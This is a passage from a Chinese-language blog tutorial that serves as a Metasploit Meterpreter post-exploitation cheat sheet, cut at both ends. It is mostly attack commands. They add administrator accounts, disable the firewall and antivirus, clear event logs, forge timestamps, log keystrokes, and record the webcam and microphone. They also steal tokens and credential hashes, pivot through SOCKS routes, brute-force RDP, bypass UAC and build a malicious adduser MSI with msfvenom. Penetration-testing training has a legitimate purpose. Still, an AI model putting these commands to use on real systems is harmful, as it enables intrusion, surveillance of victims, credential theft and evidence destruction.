class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whoami # 当前权限</span><br><span class=\"line\">quser # 查询当前在线的管理员</span><br><span class=\"line\">net user # 查看存在用户</span><br><span class=\"line\">net user 用户名 密码 &#x2F;add # 添加用户和对应密码</span><br><span class=\"line\">net localgroup 用户组名 用户名 &#x2F;add # 将指定用户添加到指定用户组</span><br><span class=\"line\">netstat -ano # 查询当前计算机中网络连接通信情况，LISTENING 表示该端口处于监听状态；ESTABLISHED 表示该端口处于工作（通信）状态</span><br><span class=\"line\">systeminfo # 查看当前计算机中的详细情况</span><br><span class=\"line\">tasklist &#x2F;svc # 查看每个进程所对应的服务</span><br><span class=\"line\">taskkill &#x2F;f &#x2F;im 程序名称 # 结束某个指定名称的程序</span><br><span class=\"line\">taskkill &#x2F;f &#x2F;PID ID # 结束某个指定 PID 的进程</span><br><span class=\"line\">tasklist | findstr &quot;字符串&quot; # 查找输出结果中指定的内容</span><br><span class=\"line\">logoff # 注销某个指定用户的 ID</span><br><span class=\"line\">shutdown -r # 重启当前计算机</span><br><span class=\"line\">netsh adcfirewall set allprofiles state off # 关闭防火墙</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306164329741.png\" alt=\"image-20210306164329741\"></p>\n<h3 id=\"uictl-开关键盘鼠标\"><a class=\"markdownIt-Anchor\" href=\"#uictl-开关键盘鼠标\">#</a> uictl 开关键盘 / 鼠标</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uictl [enable&#x2F;disable] [keyboard&#x2F;mouse&#x2F;all] # 开启或禁止键盘&#x2F;鼠标</span><br><span class=\"line\">uictl disable mouse # 禁用鼠标</span><br><span class=\"line\">uictl disable keyboard # 禁用键盘</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306164436345.png\" alt=\"image-20210306164436345\"></p>\n<h3 id=\"execute-执行文件\"><a class=\"markdownIt-Anchor\" href=\"#execute-执行文件\">#</a> execute 执行文件</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execute #在目标机中执行文件</span><br><span class=\"line\">execute -H -i -f cmd.exe # 创建新进程 cmd.exe，-H 不可见，-i 交互</span><br><span class=\"line\">execute -H -m -d notepad.exe -f payload.exe -a &quot;-o hack.txt&quot;</span><br><span class=\"line\"># -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行</span><br><span class=\"line\">&quot;-o hack.txt&quot;是 payload.exe 的运行参数</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306164555155.png\" alt=\"image-20210306164555155\"></p>\n<h3 id=\"clearav-清除日志\"><a class=\"markdownIt-Anchor\" href=\"#clearav-清除日志\">#</a> clearav 清除日志</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clearav # 清除 windows 中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306164632840.png\" alt=\"image-20210306164632840\"></p>\n<h2 id=\"文件系统命令\"><a class=\"markdownIt-Anchor\" href=\"#文件系统命令\">#</a> 文件系统命令</h2>\n<p>基本文件系统命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls # 列出当前目录中的文件列表</span><br><span class=\"line\">cd # 进入指定目录</span><br><span class=\"line\">getwd &#x2F; pwd # 查看当前工作目录</span><br><span class=\"line\">search -d c:\\\\ -f *.txt # 搜索文件 -d 目录 -f 文件名</span><br><span class=\"line\">cat c:\\\\123.txt # 查看文件内容</span><br><span class=\"line\">upload &#x2F;tmp&#x2F;hack.txt C:\\\\ # 上传文件到目标机上</span><br><span class=\"line\">download c:\\\\123.txt &#x2F;tmp&#x2F; # 下载文件到本机上</span><br><span class=\"line\">edit c:\\\\test.txt # 编辑或创建文件 没有的话，会新建文件</span><br><span class=\"line\">rm C:\\\\hack.txt # 删除文件</span><br><span class=\"line\">mkdir admin # 只能在当前目录下创建文件夹</span><br><span class=\"line\">rmdir admin # 只能删除当前目录下文件夹</span><br><span class=\"line\">getlwd &#x2F; lpwd # 查看本地当前目录</span><br><span class=\"line\">lcd &#x2F;tmp # 切换本地目录</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306164754287.png\" alt=\"image-20210306164754287\"></p>\n<h3 id=\"timestomp-伪造时间戳\"><a class=\"markdownIt-Anchor\" href=\"#timestomp-伪造时间戳\">#</a> timestomp 伪造时间戳</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">timestomp C:\\\\ -h #查看帮助</span><br><span class=\"line\">timestomp -v C:\\\\2.txt #查看时间戳</span><br><span class=\"line\">timestomp C:\\\\2.txt -f C:\\\\1.txt #将 1.txt 的时间戳复制给 2.txt</span><br><span class=\"line\">timestomp c:\\\\test\\\\22.txt -z &quot;03&#x2F;10&#x2F;2019 11:55:55&quot; -v # 把四个属性设置为统一时间</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306164910512.png\" alt=\"image-20210306164910512\"></p>\n<h2 id=\"网络命令\"><a class=\"markdownIt-Anchor\" href=\"#网络命令\">#</a> 网络命令</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipconfig&#x2F;ifconfig # 查看网络接口信息</span><br><span class=\"line\">netstat –ano # 查看网络连接状态</span><br><span class=\"line\">arp # 查看 arp 缓冲表</span><br><span class=\"line\">getproxy # 查看代理信息</span><br><span class=\"line\">route # 查看路由表信息</span><br></pre></td></tr></table></figure>\n<h3 id=\"portfwd-端口转发\"><a class=\"markdownIt-Anchor\" href=\"#portfwd-端口转发\">#</a> portfwd 端口转发</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">portfwd add -l 1234 -p 3389 -r 127.0.0.1</span><br><span class=\"line\">#将目标机的 3389 端口转发到本地 1234 端口</span><br><span class=\"line\">rdesktop 127.0.0.1:1234 # 需要输入用户名密码连接</span><br><span class=\"line\">rdesktop -u Administrator -p P@ssw0rd 127.0.0.1:1234 # -u 用户名 -p 密码</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306165457433.png\" alt=\"image-20210306165457433\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306165547893.png\" alt=\"image-20210306165547893\"></p>\n<h3 id=\"autoroute-添加路由\"><a class=\"markdownIt-Anchor\" href=\"#autoroute-添加路由\">#</a> autoroute 添加路由</h3>\n<p>参考  <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODY1MDU=\">https://www.anquanke.com/post/id/86505</span></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run autoroute -h # 查看帮助</span><br><span class=\"line\">run get_local_subnets # 查看目标内网网段地址</span><br><span class=\"line\">run autoroute -s 192.168.183.0&#x2F;24 # 添加目标网段路由</span><br><span class=\"line\">run autoroute -p # 查看添加的路由</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306165902512.png\" alt=\"image-20210306165902512\"></p>\n<p>利用 arp_scanner、portscan 等进行扫描</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.183.0&#x2F;24</span><br><span class=\"line\">run auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp RHOSTS&#x3D;192.168.183.146 PORTS&#x3D;3389</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306170155805.png\" alt=\"image-20210306170155805\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306170548344.png\" alt=\"image-20210306170548344\"></p>\n<h3 id=\"socks-代理\"><a class=\"markdownIt-Anchor\" href=\"#socks-代理\">#</a> Socks 代理</h3>\n<p>只有在目标设备添加完路由后才可以通过 msf 自带的 socks4a 模块进行 socks4 代理转发</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class=\"line\">set srvhost 127.0.0.1</span><br><span class=\"line\">set srvport 2000</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306170840980.png\" alt=\"image-20210306170840980\"></p>\n<p>然后 vim /etc/proxychains.conf ，在文件末尾添加 socks4 代理服务器</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306170930216.png\" alt=\"image-20210306170930216\"></p>\n<p>使用 proxychains 代理访问执行 nmap 操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sV -p 445 --script&#x3D;smb-vuln-ms17-010.nse 192.168.183.146 # 扫描永恒之蓝漏洞</span><br><span class=\"line\">proxychains hydra 192.168.183.146 rdp -l administrator -P password.txt -V # rdp 服务暴力破解</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306171108261.png\" alt=\"image-20210306171108261\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306171139549.png\" alt=\"image-20210306171139549\"></p>\n<h2 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h2>\n<p>常用脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run arp_scanner -r 192.168.183.1&#x2F;24 # 利用 arp 进行存活主机扫描</span><br><span class=\"line\">run winenum # 自动化执行一些检测脚本</span><br><span class=\"line\">run credcollect # 获取用户 hash</span><br><span class=\"line\">run domain_list_gen # 获取域管理账户列表</span><br><span class=\"line\">run post&#x2F;multi&#x2F;gather&#x2F;env # 获取用户环境变量</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users -c # 列出当前登录用户</span><br><span class=\"line\">run post&#x2F;linux&#x2F;gather&#x2F;checkvm # 是否虚拟机</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;checkvm # 是否虚拟机</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives # 查看存储器信息</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications # 获取安装软件信息</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;dumplinks # 获取最近访问过的文档、链接信息</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_ie # 获取 IE 缓存</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_firefox # 获取 firefox 缓存</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome # 获取 Chrome 缓存</span><br><span class=\"line\">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester # 获取本地提权漏洞</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches # 获取补丁信息</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_domain # 查找域控</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_snmp # 获取 snmp 团体名称</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;vnc # 获取 vnc 密码</span><br><span class=\"line\">run post&#x2F;windows&#x2F;wlan&#x2F;wlan_profile # 用于读取目标主机 WiFi 密码</span><br><span class=\"line\">run post&#x2F;multi&#x2F;gather&#x2F;wlan_geolocate # 基于 wlan 进行地理位置确认 文件位于&#x2F;root&#x2F;.msf4&#x2F;loot</span><br><span class=\"line\">run post&#x2F;windows&#x2F;manage&#x2F;killav 关闭杀毒软件</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306171454981.png\" alt=\"image-20210306171454981\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306171504647.png\" alt=\"image-20210306171504647\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306171918329.png\" alt=\"image-20210306171918329\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306172108912.png\" alt=\"image-20210306172108912\"></p>\n<h3 id=\"常用的破解模块\"><a class=\"markdownIt-Anchor\" href=\"#常用的破解模块\">#</a> 常用的破解模块</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;pcanywhere&#x2F;pcanywhere_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_login</span><br><span class=\"line\">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous</span><br></pre></td></tr></table></figure>\n<h3 id=\"键盘记录\"><a class=\"markdownIt-Anchor\" href=\"#键盘记录\">#</a> 键盘记录</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keyscan_start # 开始键盘记录</span><br><span class=\"line\">keyscan_dump # 导出记录数据</span><br><span class=\"line\">keyscan_stop # 结束键盘记录</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306172219342.png\" alt=\"image-20210306172219342\"></p>\n<h3 id=\"sniffer-抓包\"><a class=\"markdownIt-Anchor\" href=\"#sniffer-抓包\">#</a> sniffer 抓包</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use sniffer</span><br><span class=\"line\">sniffer_interfaces # 查看网卡</span><br><span class=\"line\">sniffer_start 1 # 选择网卡 1 开始抓包</span><br><span class=\"line\">sniffer_stats 1 # 查看网卡 1 状态</span><br><span class=\"line\">sniffer_dump 1 &#x2F;tmp&#x2F;wlan1.pcap # 导出 pcap 数据包</span><br><span class=\"line\">sniffer_stop 1 # 停止网卡 1 抓包</span><br><span class=\"line\">sniffer_release 1 # 释放网卡 1 流量</span><br></pre></td></tr></table></figure>\n<h3 id=\"窃取令牌\"><a class=\"markdownIt-Anchor\" href=\"#窃取令牌\">#</a> 窃取令牌</h3>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306172412924.png\" alt=\"image-20210306172412924\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">steal_token &lt;pid 值&gt; # 从指定进程中窃取 token</span><br><span class=\"line\">drop_token # 停止假冒当前的 token</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306172447283.png\" alt=\"image-20210306172447283\"></p>\n<h3 id=\"网络摄像头\"><a class=\"markdownIt-Anchor\" href=\"#网络摄像头\">#</a> 网络摄像头</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">record_mic # 音频录制</span><br><span class=\"line\">webcam_chat # 开启视频聊天(对方有弹窗）</span><br><span class=\"line\">webcam_list # 查看摄像头</span><br><span class=\"line\">webcam_snap # 通过摄像头拍照</span><br><span class=\"line\">webcam_stream # 通过摄像头开启视频监控(以网页形式进行监控≈直播）</span><br></pre></td></tr></table></figure>\n<h3 id=\"截屏\"><a class=\"markdownIt-Anchor\" href=\"#截屏\">#</a> 截屏</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">截屏</span><br><span class=\"line\">screenshot # 截屏</span><br><span class=\"line\">use espia # 使用 espia 模块</span><br><span class=\"line\">screengrab # 截屏</span><br></pre></td></tr></table></figure>\n<h2 id=\"提权\"><a class=\"markdownIt-Anchor\" href=\"#提权\">#</a> 提权</h2>\n<p>getsystem 提权<br>\n利用 getsystem 命令提权，该命令会自动寻找各种可能的提权技术来使得用户将权限提升到更高的级别。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getsystem 提权</span><br><span class=\"line\">getuid 查看已获得权限</span><br></pre></td></tr></table></figure>\n<h3 id=\"enum_patches-模块\"><a class=\"markdownIt-Anchor\" href=\"#enum_patches-模块\">#</a> enum_patches 模块</h3>\n<p>利用 enum_patches 模块搜集补丁信息，然后寻找可利用的 exploits 进行提权。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #查看补丁信息</span><br><span class=\"line\">background</span><br><span class=\"line\">search MS10-015</span><br><span class=\"line\">use exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d</span><br><span class=\"line\">set session 8</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306172904051.png\" alt=\"image-20210306172904051\"></p>\n<h3 id=\"绕过-uac-提权\"><a class=\"markdownIt-Anchor\" href=\"#绕过-uac-提权\">#</a> 绕过 UAC 提权</h3>\n<p>msf 内置一些 bypassuac 脚本，原理不同，使用方法类似，执行后返回一个新的会话，再次执行 getsystem 即可提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class=\"line\">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr</span><br><span class=\"line\">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class=\"line\">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection_winsxs</span><br><span class=\"line\">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup</span><br><span class=\"line\">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbs</span><br></pre></td></tr></table></figure>\n<p>使用命令 getsystem 提权失败，然后利用 bypassuac 来提权，这里利用 exploit/windows/local/bypassuac 模块 (32 位、64 位都有效)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">backgroup</span><br><span class=\"line\">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class=\"line\">set session 1</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306173046136.png\" alt=\"image-20210306173046136\"></p>\n<h3 id=\"使用-runas-提权\"><a class=\"markdownIt-Anchor\" href=\"#使用-runas-提权\">#</a> 使用 RunAs 提权</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">该方法利用 exploit&#x2F;windows&#x2F;local&#x2F;ask 模块(32 位、64 位都有效)，创建一个可执行文件并在目标机上发起一个提升权限请求的</span><br><span class=\"line\">程序，触发系统 UAC，提示用户是否要继续，如果用户选择“是”，则会返回一个高权限的 meterpreter shell。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class=\"line\">set filename update.exe # 设置反弹程序名称</span><br><span class=\"line\">set session 1</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>输入 run 命令以后会在目标机上弹出 UAC，提示用户是否允许，选择是就会返回一个高权限的 meterpreter shell</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306173138736.png\" alt=\"image-20210306173138736\"></p>\n<p>注意事项：<br>\n使用 RunAs 模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序 UAC 设置则没有要求。<br>\n使用 RunAs 模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用 EXE::Custom 选项。</p>\n<h3 id=\"假冒令牌提权\"><a class=\"markdownIt-Anchor\" href=\"#假冒令牌提权\">#</a> 假冒令牌提权</h3>\n<p>令牌是系统临时密钥，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。一般有两种类型的令牌，一种是 Delegation Tokens，也就是授权令牌，它支持交互式登录（例如远程桌面登陆登录）。还有一种是 Impersonation Tokens，也就是模拟令牌，它是非交互的会话（例如访问文件共享）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use incognito # 加载窃取令牌模块</span><br><span class=\"line\">list_tokens -u # 查看可用的用户令牌</span><br><span class=\"line\">list_tokens -g # 查看可用的用户组令牌</span><br><span class=\"line\">impersonate_token &#39;NT AUTHORITY\\SYSTEM&#39; # 假冒 SYSTEM token</span><br><span class=\"line\">rev2self #返回原始 token</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306173332626.png\" alt=\"image-20210306173332626\"></p>\n<h3 id=\"利用-alwaysinstallelevated-提权\"><a class=\"markdownIt-Anchor\" href=\"#利用-alwaysinstallelevated-提权\">#</a> 利用 AlwaysInstallElevated 提权</h3>\n<p>AlwaysInstallElevated 是一个策略设置。微软允许非授权用户以 SYSTEM 权限运行安装文件 (MSI)，如果用户启用此策略设置，那么黑客利用恶意的 MSI 文件就可以进行管理员权限的提升。</p>\n<p>查看 AlwaysInstallElevated 是否被定义</p>\n<p>不过利用此方法有个前提条件，需要有两个注册表的键值为 1，我们可以在 cmdshell 下查看 AlwaysInstallElevated 是否被定义</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer &#x2F;v AlwaysInstallElevated</span><br><span class=\"line\">reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer &#x2F;v AlwaysInstallElevate</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306173505093.png\" alt=\"image-20210306173505093\"></p>\n<p>如上图所示已经开启 AlwaysInstallElevated，如果在组策略里未定义 AlwaysInstallElevated，则会出现 “错误：系统找不到指定的注册表项或值” 的提示，如下图所示：</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306173520115.png\" alt=\"image-20210306173520115\"></p>\n<p>如果需要开启可以选择以下方法：<br>\n1. 打开组策略编辑器（运行框输入 gpedit.msc）<br>\n2. 组策略 -&gt; 计算机配置 -&gt; 管理模版 -&gt;Windows 组件 -&gt;Windows Installer-&gt; 永远以高特权进行安装：选择启用<br>\n 3. 组策略 -&gt; 用户配置 -&gt; 管理模版 -&gt;Windows 组件 -&gt;Windows Installer-&gt; 永远以高特权进行安装：选择启用</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306173539689.png\" alt=\"image-20210306173539689\"></p>\n<p>设置完成后对应注册表的位置值会设为 1，开启 AlwaysInstallElevated。</p>\n<p>生成 MSI 安装文件</p>\n<p>利用 msfvenom 命令生成一个在目标机上增加管理员用户的 MSI 安装文件，这里密码要设置为强密码，否则会报错。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;adduser USER&#x3D;msi PASS&#x3D;Abc123@@ -f msi -o msi.msi</span><br></pre></td></tr></table></figure>\n<p>上传并执行 MSI 文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span 